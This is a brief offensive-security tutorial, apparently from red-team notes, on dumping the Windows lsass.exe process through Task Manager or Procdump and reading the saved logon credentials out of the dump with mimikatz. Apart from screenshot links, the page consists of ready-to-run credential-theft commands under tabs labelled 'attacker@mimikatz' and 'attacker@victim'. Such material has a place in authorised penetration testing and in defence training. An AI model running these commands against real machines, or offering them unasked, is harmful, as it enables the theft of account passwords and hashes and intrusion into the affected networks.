# Dumping Lsass.exe to Disk and Extracting Credentials

## Task Manager

Create a minidump of the lsass.exe using task manager \(must be running as administrator\):

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-55-27.png)

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-56-12.png)

Swtich mimikatz context to the minidump:

{% code-tabs %}
{% code-tabs-item title="attacker@mimikatz" %}
```csharp
sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP
sekurlsa::logonpasswords
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-12-19-54-15.png)

## Procdump

Procdump from sysinternal's could also be used to dump the process:

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```csharp
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../.gitbook/assets/screenshot-from-2019-03-12-20-11-28.png)

![](../../.gitbook/assets/screenshot-from-2019-03-12-20-13-25.png)

